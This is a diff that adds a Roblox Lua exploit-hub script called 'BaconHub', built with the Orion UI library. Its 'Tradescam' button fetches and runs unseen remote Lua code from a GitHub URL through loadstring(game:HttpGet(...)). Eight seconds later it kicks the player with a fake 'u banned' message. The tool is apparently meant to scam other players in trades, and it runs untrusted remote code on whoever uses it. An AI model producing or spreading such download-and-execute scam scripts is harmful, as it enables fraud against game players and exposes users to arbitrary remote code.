@@ -1,0 +1,39 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "BaconHub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", Draggable = true})
+local Tab = Window:MakeTab({
+    Name = "Main",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+OrionLib:MakeNotification({
+    Name = "Title!",
+    Content = "Notification content... what will it say??",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+local executedTradeScam = false
+
+Tab:AddButton({
+    Name = "Tradescam",
+    Callback = function()
+        if not executedTradeScam then
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/b40aa3099441f9f3cc18afc9.lua'))()
+            executedTradeScam = true
+            wait(8)
+            if executedTradeScam then
+                game.Players.LocalPlayer:Kick("u banned for using TradeScam")
+            end
+        end
+    end    
+})
+
+local turnOffToggle = Tab:AddToggle({
+    Name = "Turn off TradeScam",
+    Default = false,
+    Callback = function(Value)
+        executedTradeScam = not Value
+    end    
+})
+
+OrionLib:Init()
